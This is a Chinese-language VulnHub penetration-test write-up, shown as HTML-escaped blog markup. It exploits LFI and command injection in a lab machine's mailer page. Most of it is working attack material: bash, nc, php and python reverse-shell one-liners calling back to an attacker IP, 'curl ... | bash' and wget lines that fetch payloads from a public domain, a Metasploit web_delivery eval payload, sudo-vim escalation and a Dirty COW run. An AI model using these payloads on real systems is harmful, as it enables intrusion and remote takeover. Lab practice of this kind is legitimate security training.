&lt;h3 id=&#34;dirb-目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dirb-目录扫描&#34;&gt;#&lt;/a&gt; dirb 目录扫描&lt;/h3&gt;
&lt;p&gt;仔细回想之前的操作，在 80 端口对网站渗透时，发现了 lfi 漏洞&lt;br&gt;
是在 http://192.168.31.5/?page=home 上的，尝试访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT1ob21l&#34;&gt;http://192.168.31.5:60080/?page=home&lt;/span&gt; 仍存在 lfi 漏洞&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-161.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT0vZXRjL3N1ZG9lcnM=&#34;&gt;http://192.168.31.5:60080/?page=/etc/sudoers&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-162.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;使用 dirb 对 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC8/cGFnZT0=&#34;&gt;http://192.168.31.5:60080/?page=&lt;/span&gt; 目录进行扫描&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;dirb是一个基于字典的web目录扫描工具，查找现有的（和/或隐藏的）Web对象，通过对Web服务器发起基于字典的攻击并分析响应的数据。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dirb http://192.168.31.5:60080/index.php?page=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-163.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 敏感网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXI=&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;将这些文件访问了一遍之后，发现此网站是唯一可能存在漏洞的目标&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-164.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;检查源代码，发现这里有一个 rce 漏洞&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-165.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9bWFpbA==&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=mail&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9bHM=&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=ls&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-166.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;phpcurlbashnc-反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpcurlbashnc-反弹&#34;&gt;#&lt;/a&gt; php/curl/bash/nc 反弹&lt;/h3&gt;
&lt;p&gt;判断目标服务器上是否存在相关的命令&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBjdXJs&#34;&gt; http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=which%20curl&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBweXRob24=&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=which%20python&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBwaHA=&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=which%20php&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBuYw==&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=which%20nc&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;也可以直接一句话判断所有的信息：&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTo2MDA4MC9pbmRleC5waHA/cGFnZT1tYWlsZXImYW1wO21haWw9d2hpY2glMjBjdXJsO3doaWNoJTIwcGhwO3doaWNoJTIwcHl0aG9uO3doaWNoJTIwYmFzaDs=&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=which curl;which php;which python;which bash;&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-167.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;根据收集到的服务器上的信息进行反弹shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php -r &amp;#x27;$sock=fsockopen(&amp;quot;192.168.31.135&amp;quot;,4444);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl http://www.chentuo.asia/shell.sh | bash (success)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 192.168.31.135 4444 -e /bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-168.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;kali-php木马反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kali-php木马反弹&#34;&gt;#&lt;/a&gt; kali php 木马反弹&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cp /usr/share/webshells/php/php-reverse-shell.php shell.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim shell.php 将默认端口改为kali的ip和端口号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python 3 -m http.server 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;构造如下url执行php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=wget%20http://192.168.31.135/shell.php;%20chmod%20777%20shell.php;%20ls%20-al&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-169.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;也可以将shell.php发送到有公网ip的网站上让目标机器去访问远程url地址上的payload并反弹shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp -P 2121 shell.php root@1.117.52.219:/data/wwwroot/www.chentuo.asia/shell.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;构造如下url执行php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=wget%20http://www.chentuo.asia/shell.php;%20chmod%20777%20shell.php;%20ls%20-al&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上述的方法下载下来的 shell.php 是空文件，默认不允许下载此类文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在服务器上操作 &lt;span class=&#34;built_in&#34;&gt;cp&lt;/span&gt; shell.php shell.txt,下载后重命名即可,构造如下url执行php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=wget%20http://www.chentuo.asia/shell.txt;mv%20shell.txt%20shell.php%20chmod%20777%20shell.php;%20ls%20-al&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;监听本地的 4444 端口，并且同时运行此shell.php文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[http://192.168.31.5:60080/shell.php](http://192.168.31.5:60080/shell.php)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-170.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;python反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python反弹shell&#34;&gt;#&lt;/a&gt; python 反弹 shell&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;python 反弹shell代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import socket,subprocess,os;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.31.135 &amp;quot;,4444));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;构造地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=python%20-c%20%27import%20socket,subprocess,os;%20s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.31.135%22,4444));%20os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果页面有 html 限制，在审查元素中修改即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-171.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;msf生成php反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf生成php反弹&#34;&gt;#&lt;/a&gt; msf 生成 php 反弹&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;msf生成php木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/script/web_delivery&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set target 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload php/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 192.168.31.135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将msf生成的php反弹shell的代码直接粘贴在url地址上即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://192.168.31.5:60080/index.php?page=mailer&amp;amp;mail=php%20-d%20allow_url_fopen=true%20-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;r%&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;20%22eval(file_get_contents(%27http://192.168.31.135:8080/Dk00YRQ%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在此阶段，不要退出 msf，只要 msf 在线，生成的 php 代码运行之后，msf 就会接收到 sessions&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-172.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;stty-异常处理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#stty-异常处理&#34;&gt;#&lt;/a&gt; stty 异常处理&lt;/h3&gt;
&lt;p&gt;注意使用 msf 的时候如果也用了 stty 会出现下面这个问题&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-173.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;即enter键被转化为了^M 此时再输入任何命令都无法执行了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;哪怕重启msf也无效，这里需要先退出msf，并执行stty sane，可将问题解决&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;命令sane最常出现在大多数终端的stty选项的集合中，它并不改变通信信道&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;的速率，但当终端发生混乱时，通常能够产生有益的效果。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;权限移到另一shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#权限移到另一shell&#34;&gt;#&lt;/a&gt; 权限移到另一 shell&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;当前终端：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4445 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc - lvvp 4445&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;新的终端：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-174.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sudovim提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudovim提权&#34;&gt;#&lt;/a&gt; sudo (vim) 提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo -l 发现使用waldo执行vim可以免密&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;esc --&amp;gt; :!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;esc --&amp;gt; :!bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4447 0&amp;gt;&amp;amp;1 可拿到反弹shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-175.png&#34; alt&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-176.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;脏牛提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#脏牛提权&#34;&gt;#&lt;/a&gt; 脏牛提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/firefart/dirtycow/archive/refs/heads/master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp -r parallels@192.168.31.135:~/Desktop/tool/dirtycow/dirtycow-master /tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd dirtycow-master&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc -pthread dirty.c -o dirty -lcrypt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./dirty&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-177.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
服务器崩溃，提权失败，需要重启服务器
